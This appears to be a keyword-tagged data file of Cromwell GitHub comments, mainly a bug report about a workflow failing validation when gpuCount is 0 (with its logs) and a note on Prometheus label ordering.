(Scatter) | - | 5m32.467s | 1/1 Done | 0 Failed |; | vcf_import (Scatter) | - | 8m16.609s | 1/1 Done | 0 Failed |; | vcf_merge (Scatter) | - | 2h6m53.926s | 23/23 Done | 0 Failed |; | vcf_mocha (Scatter) | - | 8m19.96s | 1/1 Done | 0 Failed |; | vcf_phase (Scatter) | - | 3h7m39.033s | 23/23 Done | 0 Failed |; | vcf_qc (Scatter) | - | 2h8m6.051s | 23/23 Done | 0 Failed |; | vcf_scatter (Scatter) | - | 5m25.444s | 1/1 Done | 0 Failed |; | vcf_split (Scatter) | - | 2h7m37.183s | 23/23 Done | 0 Failed |; | write_tsv | 1 | 5m10.124926865s | Running |; | xcl_vcf_concat | 1 | 5m28.883s | Done |; +----------------------------+---------+-----------------+-----------------------+; ```. > note: some tasks has duration of few seconds because I'm using call cache.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6677#issuecomment-1116554918
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:226,Availability,echo,echo,226,"Sure !. This is a minimal workflow that runs a task with a dynamic number of GPUs; ```version 1.0. workflow gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:881,Availability,ERROR,ERROR,881,"Sure !. This is a minimal workflow that runs a task with a dynamic number of GPUs; ```version 1.0. workflow gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:2019,Availability,ERROR,ERROR,2019,": ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflow store.; ERROR: Status of job is not Submitted, Running, or Succeeded: Failed; ```. If ran with `gpu_count >= 1` workflow run successfully. . Desired behaviour : `gpu_count = 0` runs to completion, without being assigned a gpu from the backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1438,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,1438,": ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflow store.; ERROR: Status of job is not Submitted, Running, or Succeeded: Failed; ```. If ran with `gpu_count >= 1` workflow run successfully. . Desired behaviour : `gpu_count = 0` runs to completion, without being assigned a gpu from the backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:384,Security,validat,validation,384,"Sure !. This is a minimal workflow that runs a task with a dynamic number of GPUs; ```version 1.0. workflow gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:907,Security,validat,validation,907,"Sure !. This is a minimal workflow that runs a task with a dynamic number of GPUs; ```version 1.0. workflow gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1003,Security,validat,validation,1003,"This is a minimal workflow that runs a task with a dynamic number of GPUs; ```version 1.0. workflow gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1014,Security,Validat,ValidatedRuntimeAttributesBuilder,1014,"w gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflow store.; ERROR: Status of job is not Submitted, Running, or Succeeded: Failed; ```. If ran with `",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1075,Security,validat,validation,1075,"w gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflow store.; ERROR: Status of job is not Submitted, Running, or Succeeded: Failed; ```. If ran with `",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1618,Security,validat,validation,1618,": ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflow store.; ERROR: Status of job is not Submitted, Running, or Succeeded: Failed; ```. If ran with `gpu_count >= 1` workflow run successfully. . Desired behaviour : `gpu_count = 0` runs to completion, without being assigned a gpu from the backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1629,Security,Validat,ValidatedRuntimeAttributesBuilder,1629,": ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflow store.; ERROR: Status of job is not Submitted, Running, or Succeeded: Failed; ```. If ran with `gpu_count >= 1` workflow run successfully. . Desired behaviour : `gpu_count = 0` runs to completion, without being assigned a gpu from the backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1690,Security,validat,validation,1690,": ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflow store.; ERROR: Status of job is not Submitted, Running, or Succeeded: Failed; ```. If ran with `gpu_count >= 1` workflow run successfully. . Desired behaviour : `gpu_count = 0` runs to completion, without being assigned a gpu from the backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757
https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142:882,Modifiability,refactor,refactoring,882,"@jgainerdewar Your guess was correct--Prometheus/Stackdriver labels have no concept of order, so that information is lost when the InstrumentationPath is used to derive that sort of name. The StatsD form effectively looses the additional ""what's a high variant part and what isn't"" info while the Prometheus form looses the ordering of those parts. This is normal in Prometheus-land and all the query systems are built on that assumption. . There'll definitely be tests for the Prometheus code when it's added to clearly demonstrate that--this is sorta a weird one because I want to lay the groundwork without actually adding full Prometheus support yet. [This test](https://github.com/broadinstitute/cromwell/pull/6681/files#diff-65d7248a0c8799434124fe6d53023d0d8ac3492d640bbe4510801d2981e0903fR42) and a few others check that the groundwork is working, it's just a bit of a weird refactoring until the Prometheus code takes advantage of it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142
https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142:464,Testability,test,tests,464,"@jgainerdewar Your guess was correct--Prometheus/Stackdriver labels have no concept of order, so that information is lost when the InstrumentationPath is used to derive that sort of name. The StatsD form effectively looses the additional ""what's a high variant part and what isn't"" info while the Prometheus form looses the ordering of those parts. This is normal in Prometheus-land and all the query systems are built on that assumption. . There'll definitely be tests for the Prometheus code when it's added to clearly demonstrate that--this is sorta a weird one because I want to lay the groundwork without actually adding full Prometheus support yet. [This test](https://github.com/broadinstitute/cromwell/pull/6681/files#diff-65d7248a0c8799434124fe6d53023d0d8ac3492d640bbe4510801d2981e0903fR42) and a few others check that the groundwork is working, it's just a bit of a weird refactoring until the Prometheus code takes advantage of it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142
